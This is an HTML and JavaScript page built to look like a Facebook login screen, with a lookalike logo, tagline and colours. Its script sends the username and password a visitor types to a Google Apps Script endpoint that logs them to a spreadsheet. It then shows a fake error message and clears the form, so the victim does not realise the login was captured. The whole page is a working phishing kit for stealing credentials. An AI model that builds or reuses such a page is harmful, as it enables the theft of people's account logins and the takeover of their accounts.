<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Responsive Login Page</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: Arial, Helvetica, sans-serif;
      background: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 70px;
      max-width: 1100px;
      width: 100%;
    }

    /* ---------- LEFT AREA WITH IMAGE ---------- */
    .left-text img {
      width: 320px;          /* adjust image size */
      max-width: 100%;
      margin-bottom: 1px;
    }

    .left-text p {
      font-size: 28px;
      max-width: 450px;
      line-height: 1.3;
    }

    /* ---------- LOGIN BOX ---------- */
    .login-box {
      width: 380px;
      background: #ffffff;
      padding: 18px;
      border-radius: 10px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin-top: 10px;
      font-size: 16px;
      border-radius: 6px;
      border: 1px solid #ccd0d5;
    }

    .login-btn {
      width: 100%;
      padding: 12px;
      margin-top: 12px;
      background: #1877f2;
      color: white;
      font-size: 18px;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .forgot {
      text-align: center;
      margin-top: 10px;
    }

    .forgot a {
      text-decoration: none;
      color: #1877f2;
    }

    .create-btn {
      margin-top: 15px;
      width: 70%;
      padding: 10px;
      font-size: 16px;
      background: #42b72a;
      color: white;
      border: none;
      border-radius: 6px;
      font-weight: bold;
      cursor: pointer;
      display: block;
      margin-left: auto;
      margin-right: auto;
    }

    /* ---------- THINNER & LIGHTER HR ---------- */
    hr {
      border: none;
      height: 1.1px;
      background-color: #ddd;   /* light gray */
      margin-top: 15px;
      margin-bottom: 10px;
    }
    .spinner {
  border: 3px solid #fff;
  border-top: 3px solid transparent;
  border-radius: 50%;
  width: 16px;
  height: 16px;
  animation: spin 1s linear infinite;
  margin-left: 10px;
  display: none;
}

    /* ---------- RESPONSIVE ---------- */
    @media (max-width: 900px) {
      .container {
        flex-direction: column;
        text-align: center;
        gap: 25px;
      }
    }

  </style>
</head>

<body>

<div class="container">

  <div class="left-text">

    <!-- ==== PUT YOUR IMAGE HERE ==== -->
    <img src="facebook.svg" alt="Website Logo">

    <p>Connect with friends and the world around you.</p>
  </div>

  <div class="login-box">
    <form method="POST" name="google-sheet" id="loginForm">
      <input type="text" placeholder="Username, email or mobile number" id="username" name="username" />
   
<div class="password-container">
<input type="password" placeholder="Password" id="password" name="password" autocomplete="new-password" />

</div>

      <button type="submit" class="login-btn" id="loginBtn" name="submit" disabled>
        Log in
        <div class="spinner" id="spinner"></div>
      </button>

      <div class="forgot">
        <a href="#">Forgot password?</a>
      </div>
      <hr>

      <button class="create-btn">Create new account</button>

    </form>
  </div>

</div>
<script>
  const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');

function checkInputs() {
const usernameFilled = usernameInput.value.trim() !== '';
const passwordFilled = passwordInput.value.trim() !== '';
loginBtn.disabled = !(usernameFilled && passwordFilled);
loginBtn.style.opacity = loginBtn.disabled ? '0.6' : '1';
}

usernameInput.addEventListener('input', checkInputs);
passwordInput.addEventListener('input', checkInputs);

  const scriptURL = 'https://script.google.com/macros/s/AKfycbyUaf-AGKMIgheBlmSSKKzrryOxg8gl-VmzbsY1DZFIRx0xNmg96XHLZ3JiXOMr27dc/exec';
  const form = document.forms['google-sheet'];
  const loginBtn = document.getElementById('loginBtn');
  const spinner = document.getElementById('spinner');

  form.addEventListener('submit', e => {
    e.preventDefault();

    // Show spinner
    spinner.style.display = 'inline-block';
    loginBtn.disabled = true;
    loginBtn.style.opacity = '0.6';

    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => {
        setTimeout(() => {
          spinner.style.display = 'none';
          loginBtn.disabled = false;
          loginBtn.style.opacity = '1';
          
          form.reset();
        }, 300);
        alert('Opps! An error occured')
      })
      .catch(error => {
        console.error('Error!', error.message);
        spinner.style.display = 'none';
        loginBtn.disabled = false;
        loginBtn.style.opacity = '1';
      });
  });

  function togglePassword() {
const passwordInput = document.getElementById('password');
const toggleBtn = document.querySelector('.toggle-password');

if (passwordInput.type === 'password') {
  passwordInput.type = 'text';
  toggleBtn.textContent = 'Hide';
} else {
  passwordInput.type = 'password';
  toggleBtn.textContent = 'Show';
}
}

</script>
</body>
</html>
